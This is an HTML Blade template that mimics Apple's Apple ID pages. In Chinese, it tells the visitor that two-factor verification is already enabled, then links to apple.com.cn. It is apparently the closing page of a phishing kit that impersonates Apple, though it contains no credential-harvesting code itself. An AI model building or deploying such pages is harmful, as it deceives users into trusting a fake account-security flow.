<!DOCTYPE html>
<html dir="ltr" data-rtl="false" lang="zh">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


    <link rel="stylesheet" href="{{ asset('/fonts/fontss.css') }}" type="text/css">

    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">


    <style type="text/css">

         .success-icon-wrap {
            margin-bottom: 26px;
        }
        .icon.icon_green_check.success {
            color: #5cc629;
        }
        .icon.xl {
            font-size: 90px;
        }
        .icon {
            font-family: shared-icons;
            display: inline-block;
            vertical-align: middle;
            line-height: 1;
            font-weight: 400;
            font-style: normal;
            speak: none;
            text-decoration: inherit;
            text-transform: none;
            text-rendering: optimizeLegibility;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

    </style>
</head>

<body class="tk-body ">
    <div aria-hidden="true" style="font-family:&quot;SF Pro Icons&quot;; width: 0px; height: 0px; color: transparent;">.
    </div>
    <div aria-hidden="true"
        style="font-family:&quot;SF Pro Display&quot;; width: 0px; height: 0px; color: transparent;">.
    </div>
    <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
        <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">

            <div class="success-icon-wrap" width="300px"><i class="icon icon_green_check success xl desktop"></i></div>





             <div class="table-responsive">
                <h2 class="as-center">Apple ID 双重验证</h2>
                <br>
                <p class="as-center" style="color:blue">您的Apple ID已经启用双重验证无需重复开启。</p>
            </div>
        <br>
            <a href="https://www.apple.com.cn/" target="_blank" class="nav text-centered">
                <button role="button" class="button iforgot-btn done">完成</button>
            </a>

            <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
            </idms-modal>
        </apple-auth>
    </div>

</body>

</html>
